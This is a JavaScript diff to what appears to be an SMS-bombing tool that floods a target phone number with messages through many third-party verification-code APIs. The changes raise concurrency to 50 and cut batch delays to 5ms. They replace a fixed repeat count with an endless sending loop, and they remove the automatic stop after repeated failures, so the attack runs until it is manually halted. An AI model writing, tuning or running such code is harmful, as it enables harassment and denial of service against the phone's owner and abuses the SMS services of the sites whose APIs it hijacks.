@@ -3422,7 +3422,8 @@ button:hover {
                     const response = await fetch(proxiedUrl, {
                         ...options,
                         mode: 'cors',
-                        credentials: 'omit' // 跨域时不发送凭证
+                        credentials: 'omit', // 跨域时不发送凭证
+                        signal: AbortSignal.timeout(REQUEST_TIMEOUT) // 添加超时控制
                     });
                     
                     // 如果成功，返回响应
@@ -3467,11 +3468,12 @@ button:hover {
         
         // ⭐ 连续失败计数器（用于自动停止）
         let consecutiveFailures = 0;
-        const MAX_CONSECUTIVE_FAILURES = 20; // 连续失败20次后自动停止
+        const MAX_CONSECUTIVE_FAILURES = 30; // 连续失败30次后自动停止（优化：20→30）
         
         // 并发控制配置（防止请求堵塞）
-        const MAX_CONCURRENT = 30; // 最大并发数（已优化：10→30）⚡
-        const REQUEST_DELAY = 10; // 每批请求间隔(ms)（已优化：100ms→10ms）⚡
+        const MAX_CONCURRENT = 50; // 最大并发数（已优化：30→50）⚡
+        const REQUEST_DELAY = 5; // 每批请求间隔(ms)（已优化：10ms→5ms）⚡
+        const REQUEST_TIMEOUT = 15000; // 单个请求超时时间(ms) 15秒
         
         // ⭐ 请求去重缓存（避免短时间内重复请求相同URL）
         const requestCache = new Map();
@@ -3623,17 +3625,23 @@ button:hover {
     document.getElementById('stopBtn').style.display = 'inline-block';
     
     addLog(`开始向 ${phoneNumber} 发送短信...`, 'system');
+    addLog(`♾️ 无限循环模式：将持续发送直到点击停止`, 'info');
 
-    const requestTasks = [];
-    
-    // ⚡ 循环次数配置（提高成功率和发送频率）
-    const REPEAT_COUNT = 3; // 每个接口执行3次
+    // ⚡ 无限循环发送函数
+    async function infiniteLoop() {
+        let roundCount = 0; // 轮次计数
+        
+        while (isRunning) {
+            roundCount++;
+            console.log(`\n🔄 第 ${roundCount} 轮发送开始...`);
+            addLog(`🔄 第 ${roundCount} 轮`, 'info');
+            
+            const requestTasks = [];
+            let batchTotal = 0;
 
-    for (let i = 0; i < times; i++) {
-        // ⚡ 让每个接口循环执行多次
-        for (let repeat = 0; repeat < REPEAT_COUNT; repeat++) {
             apiRequests.forEach((apiRequest) => {
-                const requestData = apiRequest.data(phoneNumber, i + 1);
+                const requestData = apiRequest.data(phoneNumber, roundCount);
+                batchTotal++;
                 totalRequests++;
 
                 // 创建请求任务（带监控）
@@ -3651,7 +3659,7 @@ button:hover {
                     
                     // 获取实际 URL（支持动态 URL）
                     const actualUrl = typeof apiRequest.url === 'function' 
-                        ? apiRequest.url(phoneNumber, i + 1) 
+                        ? apiRequest.url(phoneNumber, roundCount) 
                         : apiRequest.url;
 
             if (apiRequest.method && apiRequest.method === 'GET') {
@@ -3774,12 +3782,10 @@ button:hover {
                             addLog(`❌ ${failReason} (${duration}ms)`, 'error');
                         }
                         
-                        // ⭐ 连续失败过多，自动停止
-                        if (consecutiveFailures >= MAX_CONSECUTIVE_FAILURES && isRunning) {
-                            isRunning = false;
-                            addLog(`⚠️ 连续失败${consecutiveFailures}次，已自动停止`, 'error');
-                            addLog(`💡 可能是代理额度超限，请明天再试`, 'info');
-                            console.error(`🛑 连续失败${consecutiveFailures}次，自动停止发送`);
+                        // ⭐ 连续失败警告（但不自动停止）
+                        if (consecutiveFailures >= MAX_CONSECUTIVE_FAILURES && consecutiveFailures % 10 === 0) {
+                            addLog(`⚠️ 已连续失败${consecutiveFailures}次`, 'error');
+                            console.warn(`⚠️ 连续失败${consecutiveFailures}次，但继续发送...`);
                         }
                     }
                     
@@ -3801,18 +3807,30 @@ button:hover {
             };
 
             requestTasks.push(createRequestTask());
-        });
+            });
+
+            // 执行本轮所有请求
+            console.log(`📦 本轮创建 ${batchTotal} 个请求任务`);
+            const batchStartTime = Date.now();
+            
+            await runWithConcurrency(requestTasks, MAX_CONCURRENT);
+            
+            const batchTime = ((Date.now() - batchStartTime) / 1000).toFixed(2);
+            console.log(`✅ 第 ${roundCount} 轮完成，耗时: ${batchTime}秒\n`);
+            
+            // 检查是否被停止
+            if (!isRunning) {
+                break;
+            }
+            
+            // 轮次间隔（避免过快）
+            await sleep(1000); // 每轮间隔1秒
         }
     }
 
-    // 使用并发控制执行所有请求
-    console.log(`\n📦 总共创建 ${totalRequests} 个请求任务`);
-    console.log(`⚙️  使用 ${MAX_CONCURRENT} 个并发执行\n`);
-    
+    // 启动无限循环
     const startTime = Date.now();
-    
-    await runWithConcurrency(requestTasks, MAX_CONCURRENT);
-    
+    await infiniteLoop();
     const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
     
     // 打印详细统计
@@ -3845,28 +3863,20 @@ button:hover {
     
     // 添加最终统计日志（显示完整统计）
     addLog('─'.repeat(30), 'system');
-    if (wasRunning) {
-        addLog(`📊 发送完成！`, 'system');
-    } else {
-        addLog(`⏹️ 已停止发送`, 'system');
-    }
+    addLog(`⏹️ 已停止发送`, 'system');
     
     // 计算成功率
     const successRate = totalRequests > 0 ? ((successCount / totalRequests) * 100).toFixed(1) : 0;
     
     // 显示完整统计
+    addLog(`📊 总请求: ${totalRequests} 个`, 'info');
     if (successCount > 0) {
         addLog(`✅ 成功: ${successCount} 个 (${successRate}%)`, 'success');
     }
     if (failureCount > 0) {
         addLog(`❌ 失败: ${failureCount} 个`, 'error');
     }
-    addLog(`⏱️ 耗时: ${totalTime}秒`, 'info');
-    
-    // 如果大量失败，提示代理问题
-    if (failureCount > successCount * 2) {
-        addLog(`⚠️ 大量请求失败，请检查代理配置`, 'error');
-    }
+    addLog(`⏱️ 总耗时: ${totalTime}秒`, 'info');
     addLog('─'.repeat(30), 'system');
 }
 
